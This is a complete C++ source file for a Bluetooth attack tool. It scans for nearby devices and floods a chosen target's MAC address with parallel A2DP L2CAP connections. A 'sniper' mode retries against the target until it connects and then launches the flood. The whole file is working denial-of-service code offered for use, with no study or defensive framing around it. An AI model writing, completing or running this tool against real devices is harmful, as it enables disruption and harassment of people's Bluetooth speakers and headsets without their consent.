#include <iostream>            // For standard I/O operations (cout, cerr, etc.)
#include <sys/socket.h>        // For socket programming, which Bluetooth uses
#include <cstring>             // For string manipulation functions like strcpy
#include <thread>              // For multi-threading, used to flood connections simultaneously
#include <vector>              // For the vector container, used to store device addresses
#include <unistd.h>            // For functions like sleep() and usleep(), used for delays
#include <bluetooth/bluetooth.h>  // Basic Bluetooth functions (like MAC address handling)
#include <bluetooth/hci.h>       // For Host Controller Interface (HCI) functions, used to interact with Bluetooth devices
#include <bluetooth/hci_lib.h>   // HCI library functions for interacting with the Bluetooth stack
#include <bluetooth/l2cap.h>     // For L2CAP (Logical Link Control and Adaptation Protocol), used to make Bluetooth connections
#include <bluetooth/sdp.h>       // For Service Discovery Protocol (SDP), used to discover services on Bluetooth devices
#include <bluetooth/sdp_lib.h>   // SDP library functions for querying and manipulating services
#include <cctype>              // For functions like isxdigit(), used to check MAC address format
#include <algorithm>           // For the std::find algorithm, used to search within the vector

using namespace std;

// Function to validate MAC address format
// Checks if the provided MAC address string is valid (length 17, format like "XX:XX:XX:XX:XX:XX")
bool is_valid_mac(const string& mac) {
    if (mac.length() != 17) return false;
    for (int i = 0; i < 17; i++) {
        if (i % 3 == 2) {
            if (mac[i] != ':') return false;  // Ensure every 3rd character is ':'
        } else {
            if (!isxdigit(mac[i])) return false;  // Ensure all other characters are valid hex digits
        }
    }
    return true;
}

// Function to attempt a single A2DP connection to the target device using its MAC address
bool connect_a2dp(const string& target) {
    struct sockaddr_l2 addr = {0};  // Define the L2CAP socket address structure for Bluetooth
    int sock;

    // Create an L2CAP socket
    sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (sock < 0) {
        cerr << "ERROR: Unable to create socket" << endl;
        return false;
    }

    // Setup target address and protocol for A2DP connection
    addr.l2_family = AF_BLUETOOTH;  // Set the address family to Bluetooth
    str2ba(target.c_str(), &addr.l2_bdaddr);  // Convert target MAC address string to Bluetooth address
    addr.l2_psm = htobs(0x0019);  // PSM (Protocol/Service Multiplexer) for A2DP (0x0019 is for audio streaming)

    // Attempt to connect the socket
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        cout << "Successfully connected to A2DP on " << target << endl;
        close(sock);  // Close the socket after successful connection
        return true;
    } else {
        cerr << "ERROR: Could not connect to A2DP on " << target << endl;
        close(sock);  // Close the socket if connection failed
        return false;
    }
}

// Function to flood the target device with multiple A2DP connections
void flood_device_a2dp(const string& target, int num_connections) {
    vector<thread> threads;  // Create a vector to store threads

    // Create multiple threads to establish simultaneous connections
    for (int i = 0; i < num_connections; ++i) {
        threads.emplace_back([target]() {
            connect_a2dp(target);  // Attempt an A2DP connection in each thread
            // Add a slight delay if needed between connections
            // usleep(100000);
        });
    }

    // Wait for all threads to finish
    for (auto& th : threads) {
        th.join();
    }
}

// Function to scan for nearby Bluetooth devices
// Returns the number of devices found and stores their MAC addresses in the provided vector
int devicescan(vector<string>& device_list) {
    cout << "Scanning for devices...\n";
    inquiry_info *devices = NULL;  // Structure to store inquiry results (nearby devices)
    int max_devices = 255;  // Maximum number of devices to find
    int device_id, sock, len, flags, num_rsp;
    char addr[19] = {0};  // Buffer for MAC address
    char name[248] = {0};  // Buffer for device name

    // Get the local Bluetooth adapter ID
    device_id = hci_get_route(NULL);
    sock = hci_open_dev(device_id);  // Open a Bluetooth socket for the local adapter
    if (device_id < 0 || sock < 0) {
        cerr << "ERROR: Trouble finding Bluetooth adapter" << endl;
        return -1;
    }

    // Set up Bluetooth inquiry parameters
    len = 8;  // Inquiry duration (1.28 * len) seconds
    flags = IREQ_CACHE_FLUSH;  // Clear the cache to get fresh results
    devices = (inquiry_info*) malloc(max_devices * sizeof(inquiry_info));  // Allocate memory for device info

    // Perform the device inquiry
    num_rsp = hci_inquiry(device_id, len, max_devices, NULL, &devices, flags);
    if (num_rsp < 0) {
        cerr << "ERROR: No connections in range" << endl;
        free(devices);
        close(sock);
        return 0;
    }

    // Process the found devices and store their MAC addresses
    for (int i = 0; i < num_rsp; ++i) {
        ba2str(&(devices[i].bdaddr), addr);  // Convert Bluetooth address to string
        memset(name, 0, sizeof(name));

        // Try to get the device name, if not available, set it to "[unknown]"
        if (hci_read_remote_name(sock, &(devices[i].bdaddr), sizeof(name), name, 0) < 0) {
            strcpy(name, "[unknown]");
        }
        cout << "Device found: " << name << " (" << addr << ")\n";
        device_list.push_back(string(addr));  // Store the MAC address in the vector
    }

    free(devices);  // Free allocated memory
    close(sock);  // Close the Bluetooth socket

    return num_rsp;
}

int main(int argc, char* argv[]) {
    string target;  // Target MAC address
    int num_connections = 4;  // Number of connections to flood

    // Check if sniper mode is enabled
    if (argc > 1 && string(argv[1]) == "sniper") {
        // Sniper mode: Continuously attempt to connect to the target
        if (argc < 3) {
            cerr << "ERROR: Target MAC address is required in sniper mode.\n";
            cerr << "Usage: " << argv[0] << " sniper <TARGET_MAC_ADDRESS>\n";
            return 1;
        }
        target = argv[2];  // Get the target MAC address from command line
        if (!is_valid_mac(target)) {
            cerr << "ERROR: Invalid MAC address format.\n";
            return 1;
        }
        cout << "Entering sniper mode targeting " << target << "...\n";

        int loop_counter = 1;
        while (true) {
            // Try to connect to the target device
            cout << "Attempt #" << loop_counter << ": Trying to connect to " << target << endl;
            bool success = connect_a2dp(target);
            if (success) {
                cout << "Connection successful! Initiating flood...\n";
                flood_device_a2dp(target, num_connections);  // Start flooding after successful connection
                break;  // Exit loop after successful flood
            } else {
                cout << "Connection failed. Retrying...\n";
                usleep(500000);  // Wait 500ms before retrying
            }
            loop_counter++;  // Increment the loop counter for each attempt
        }
    } else if (argc > 1 && is_valid_mac(argv[1])) {
        // Direct flooding mode: Target MAC address is provided as an argument
        target = argv[1];
        cout << "Target MAC address: " << target << "\n";

        // Flood the device with A2DP connections
        cout << "Flooding (" << target << ") with " << num_connections << " A2DP connections...\n";
        flood_device_a2dp(target, num_connections);
    } else if (argc == 1) {
        // No arguments: Scan for devices and then flood a specified target
        vector<string> device_list;  // List to store found devices
        int num_rsp = devicescan(device_list);  // Scan for devices
        if (num_rsp <= 0) {
            cout << "No devices found\n";
            return 0;
        }

        // Ask the user for the target MAC address
        cout << "Enter the target's MAC address: ";
        cin >> target;
        if (!is_valid_mac(target)) {
            cerr << "ERROR: Invalid MAC address format.\n";
            return 1;
        }

        // Check if the entered MAC address is in the scanned devices list
        if (find(device_list.begin(), device_list.end(), target) == device_list.end()) {
            cout << "WARNING: The target MAC address was not found in the scanned devices.\n";
        }

        // Flood the target device with A2DP connections
        cout << "Flooding (" << target << ") with " << num_connections << " A2DP connections...\n";
        flood_device_a2dp(target, num_connections);
    } else {
        // Invalid usage
        cerr << "ERROR: Invalid arguments.\n";
        cerr << "Usage:\n";
        cerr << "  " << argv[0] << "\n";
        cerr << "  " << argv[0] << " <TARGET_MAC_ADDRESS>\n";
        cerr << "  " << argv[0] << " sniper <TARGET_MAC_ADDRESS>\n";
        return 1;
    }
    return 0;
}
